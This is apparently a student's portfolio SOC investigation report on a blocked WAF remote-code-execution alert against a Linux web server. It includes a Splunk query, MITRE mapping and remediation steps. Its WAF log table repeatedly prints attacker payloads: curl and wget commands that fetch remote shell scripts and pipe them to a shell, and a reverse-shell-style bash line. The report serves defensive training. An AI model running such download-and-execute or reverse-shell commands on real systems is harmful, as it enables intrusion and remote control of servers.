# SOC Analyst Investigation Report

## Ticket Overview

| Field            | Details                                   |
| ---------------- | ----------------------------------------- |
| Ticket ID        | CS-026                                    |
| Alert Name       | WAF: Remote Code Execution                |
| Ticket Status    | In Progress                               |
| Priority / SLA   | Normal / Default SLA                      |
| Created Date     | 3/2/25 7:45 PM                            |
| Assigned To      | Ananda Das / SOC Team                     |
| Analyst Decision | **True Positive — Denied/Blocked by WAF** |

## Executive Summary

A WAF alert was triggered for **Remote Code Execution** involving inbound HTTPS traffic from external source IP **91.194.84.10** to internal web server **10.0.2.32 / LinITWebServer01** on **443/TCP**.

The initial request targeted **it.abc.com/admin** with an RCE-style payload attempting shell command execution using `bash`. The initial event showed **Allowed** while the WAF was in **Monitoring** mode; however, the response code was **403**, indicating the request was denied. Later WAF logs showed repeated RCE attempts from the same source were **Blocked** in **Blocking** mode with HTTP **403**.

No successful command execution, reverse shell, malware download, web shell activity, host compromise, or service impact was confirmed from the provided evidence.

## Alert Details

| Field                 | Value                                                                                                    |
| --------------------- | -------------------------------------------------------------------------------------------------------- |
| Receive Time          | 12/25/2024 05:06                                                                                         |
| Source IP             | 91.194.84.10                                                                                             |
| Source Port           | 43544                                                                                                    |
| Destination IP        | 10.0.2.32                                                                                                |
| Destination Port      | 443                                                                                                      |
| Site Name             | it.abc.com                                                                                    |
| Initial URL           | /admin                                                                                                   |
| HTTP Method           | GET                                                                                                      |
| Threat Name           | Remote Code Execution                                                                                    |
| Severity              | Critical                                                                                                 |
| Initial Action        | Allowed                                                                                                  |
| Initial Response Code | 403                                                                                                      |
| Later WAF Action      | Blocked                                                                                                  |
| WAF Mode              | Monitoring / Blocking                                                                                    |
| Source Details        | WIIT AG; Data Center/Web Hosting/Transit; AS24961; mail.legaltricks.com; wiit.cloud; Dusseldorf, Germany |
| Abuse Confidence      | 26%                                                                                                      |

## Affected Assets

| Asset Field          | Details                                           |
| -------------------- | ------------------------------------------------- |
| Destination IP       | 10.0.2.32                                         |
| Hostname             | LinITWebServer01                                  |
| Operating System     | Linux - RHEL 8                                    |
| Platform             | Linux                                             |
| Asset Role           | Web Server                                        |
| Hosting              | AWS Cloud                                         |
| Business Criticality | Not Provided                                      |
| Exposure Concern     | Public web application targeted with RCE payloads |

## Evidence Reviewed

| Evidence Source              | Observation                                                         |                  |                                  |
| ---------------------------- | ------------------------------------------------------------------- | ---------------- | -------------------------------- |
| WAF Alert                    | Remote Code Execution detected against `/admin`                     |                  |                                  |
| Initial Payload              | `bash -i >& /test/w/aumentoup.s3.us-east-2.amazonaws.com/8080 0>&1` |                  |                                  |
| Additional Payloads          | `curl ...                                                           | bash`, `wget ... | sh`, reverse-shell style command |
| Affected URLs                | `/admin`, `/api`, `/login`, `/products`, `/search`                  |                  |                                  |
| HTTP Methods                 | GET, POST, PUT                                                      |                  |                                  |
| Initial Result               | Allowed in Monitoring mode, HTTP **403**                            |                  |                                  |
| Later Results                | Blocked in Blocking mode, HTTP **403**                              |                  |                                  |
| Successful RCE               | Not Observed                                                        |                  |                                  |
| Reverse Shell / Callback     | Not Observed                                                        |                  |                                  |
| Malware Download / Execution | Not Observed                                                        |                  |                                  |
| Service Impact               | Not Provided                                                        |                  |                                  |

## SIEM / Splunk Analysis

```spl
index=main "91.194.84.10" "10.0.2.32" sourcetype=waf_logs Threat_Name="Remote Code Execution"
| table _time, srcIP, dstIP, Action, http_method, matched_string, response_code, URL, user_agent, waf_mode
```

### Full Reviewed WAF Log Results

```text
_time	srcIP	dstIP	Action	http_method	matched_string	response_code	URL	user_agent	waf_mode
2025-02-19 05:06:00	91.194.84.10	10.0.2.32	Blocked	PUT	wget  https://loggen.hover.benedwards.co.uk/shell.sh | sh	403	/search	Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15	Blocking
2025-02-19 05:06:00	91.194.84.10	10.0.2.32	Blocked	GET	wget  https://loggen.hover.benedwards.co.uk/shell.sh | sh	403	/api	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/58.0.3029.110 Safari/537.3	Blocking
2025-02-13 05:06:00	91.194.84.10	10.0.2.32	Blocked	PUT	wget  https://loggen.hover.benedwards.co.uk/shell.sh | sh	403	/admin	Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15	Blocking
2025-02-11 05:06:00	91.194.84.10	10.0.2.32	Blocked	PUT	curl https://videoprimefamily.info/login.php | bash	403	/products	Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0	Blocking
2025-02-05 05:06:00	91.194.84.10	10.0.2.32	Blocked	PUT	curl https://videoprimefamily.info/login.php | bash	403	/login	Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15	Blocking
2025-02-05 05:06:00	91.194.84.10	10.0.2.32	Blocked	POST	curl https://videoprimefamily.info/login.php | bash	403	/api	Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0	Blocking
2025-02-05 05:06:00	91.194.84.10	10.0.2.32	Blocked	PUT	curl https://videoprimefamily.info/login.php | bash	403	/products	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/58.0.3029.110 Safari/537.3	Blocking
2025-02-05 05:06:00	91.194.84.10	10.0.2.32	Blocked	POST	curl https://videoprimefamily.info/login.php | bash	403	/api	Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0	Blocking
2025-01-25 05:06:00	91.194.84.10	10.0.2.32	Blocked	PUT	curl https://videoprimefamily.info/login.php | bash	403	/search	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/58.0.3029.110 Safari/537.3	Blocking
2025-01-25 05:06:00	91.194.84.10	10.0.2.32	Blocked	POST	wget  https://loggen.hover.benedwards.co.uk/shell.sh | sh	403	/api	Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15	Blocking
2025-01-24 05:06:00	91.194.84.10	10.0.2.32	Blocked	POST	curl https://videoprimefamily.info/login.php | bash	403	/products	Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15	Blocking
2025-01-20 05:06:00	91.194.84.10	10.0.2.32	Blocked	GET	bash -i >& /test/w/aumentoup.s3.us-east-2.amazonaws.com/8080 0>&1	403	/products	Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0	Blocking
2025-01-15 05:06:00	91.194.84.10	10.0.2.32	Blocked	GET	bash -i >& /test/w/aumentoup.s3.us-east-2.amazonaws.com/8080 0>&1	403	/products	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/58.0.3029.110 Safari/537.3	Blocking
2025-01-05 05:06:00	91.194.84.10	10.0.2.32	Blocked	POST	bash -i >& /test/w/aumentoup.s3.us-east-2.amazonaws.com/8080 0>&1	403	/api	Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0	Blocking
2025-01-05 05:06:00	91.194.84.10	10.0.2.32	Blocked	POST	curl https://videoprimefamily.info/login.php | bash	403	/products	Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0	Blocking
2025-01-03 05:06:00	91.194.84.10	10.0.2.32	Blocked	PUT	wget  https://loggen.hover.benedwards.co.uk/shell.sh | sh	403	/api	Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0	Blocking
2025-01-03 05:06:00	91.194.84.10	10.0.2.32	Blocked	POST	wget  https://loggen.hover.benedwards.co.uk/shell.sh | sh	403	/search	Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15	Blocking
2025-01-01 05:06:00	91.194.84.10	10.0.2.32	Blocked	PUT	wget  https://loggen.hover.benedwards.co.uk/shell.sh | sh	403	/admin	Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0	Blocking
2024-12-26 05:06:00	91.194.84.10	10.0.2.32	Blocked	PUT	wget  https://loggen.hover.benedwards.co.uk/shell.sh | sh	403	/api	Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0	Blocking
2024-12-26 05:06:00	91.194.84.10	10.0.2.32	Blocked	GET	curl https://videoprimefamily.info/login.php | bash	403	/login	Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0	Blocking
2024-12-25 05:06:00	91.194.84.10	10.0.2.32	Allowed	GET	bash -i >& /test/w/aumentoup.s3.us-east-2.amazonaws.com/8080 0>&1	403	/admin	Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15	Monitoring
```

## MITRE ATT&CK Mapping

| Tactic              | Technique                                     | ID        | Reason                                                                        |
| ------------------- | --------------------------------------------- | --------- | ----------------------------------------------------------------------------- |
| Initial Access      | Exploit Public-Facing Application             | T1190     | RCE payloads targeted public web application paths                            |
| Execution           | Command and Scripting Interpreter: Unix Shell | T1059.004 | Payloads attempted shell execution using `bash`, `sh`, `curl`, and `wget`     |
| Command and Control | Ingress Tool Transfer                         | T1105     | Payloads attempted to download remote scripts; download success not confirmed |

## Analyst Assessment

**Assessment:** **True Positive — RCE Attempt Denied/Blocked**

The alert is valid because WAF logs show repeated RCE-style payloads attempting shell command execution and remote script download/execution. The activity targeted multiple web application paths over multiple dates.

This is **not confirmed compromise**. No successful command execution, reverse shell, malware execution, web shell upload, outbound callback, or service impact was observed.

## Impact Analysis

| Area            | Assessment                                                  |
| --------------- | ----------------------------------------------------------- |
| Confidentiality | No unauthorized data access observed                        |
| Integrity       | No command execution or file modification confirmed         |
| Availability    | No service disruption reported                              |
| Business Impact | No confirmed impact; RCE would be high impact if successful |
| Current Risk    | Reduced because requests were denied/blocked by WAF         |

## Recommended Actions

1. Block source IP **91.194.84.10** at the firewall as per policy.
2. Add **91.194.84.10** to IPS/WAF denylist or watchlist if supported.
3. Keep WAF Remote Code Execution protection in **Blocking** mode.
4. Validate IPS/WAF signatures for the observed RCE payload patterns.
5. Review web logs for any similar RCE payloads returning HTTP **200**.
6. Review outbound logs from **10.0.2.32** for connections to:

   * `aumentoup.s3.us-east-2.amazonaws.com`
   * `videoprimefamily.info`
   * `loggen.hover.benedwards.co.uk`
7. Confirm no successful download or execution of remote scripts occurred.
8. Disable unnecessary HTTP methods such as PUT if not required.
9. Escalate only if command execution, outbound callback, web shell activity, HTTP 200 exploit response, endpoint alert, or service impact is observed.

## Escalation Decision

**Decision:** **No SOC L2 escalation required; close after firewall/IPS/WAF rule update.**

**Reason:** The RCE attempts were denied/blocked with HTTP **403**, and no successful command execution, reverse shell, malware download, web shell upload, host compromise, or service impact was confirmed from the reviewed evidence.

## Final Ticket Closure Comment

SOC investigated ticket **CS-026— WAF: Remote Code Execution**. Inbound HTTPS traffic from **91.194.84.10** to **10.0.2.32 / LinITWebServer01** targeted **it.abc.com** with RCE-style payloads using `bash`, `curl`, `wget`, and `sh`. The initial event was allowed while WAF was in Monitoring mode but returned HTTP **403**. Later related events were blocked in Blocking mode with HTTP **403**. No successful command execution, reverse shell, malware download, web shell upload, host compromise, or service impact was observed. Ticket can be closed as **True Positive — Denied/Blocked by WAF**, with source IP blocking and RCE signature enforcement recommended.

## Skills Demonstrated

WAF alert triage, remote code execution investigation, payload analysis, web server risk assessment, Splunk log review, source context validation, MITRE ATT&CK mapping, impact assessment, escalation decision-making, and SOC ticket documentation.

---

## ⚠️ Disclaimer

This repository is created for educational, portfolio, and career development purposes only.

All scenarios are sanitized and written in a safe format. No confidential company information, client data, or real production logs are included.

---

## 👤 Author

**Ananda Das**
Cybersecurity Student | SOC Analyst Learner | SIEM, Threat Detection & Incident Response Enthusiast

GitHub: [@nothingnhm](https://github.com/nothingnhm)

---

## ⭐ Repository Purpose

This project is part of my cybersecurity portfolio to demonstrate practical experience in ticket triage, IT troubleshooting, SOC alert analysis, and professional documentation.
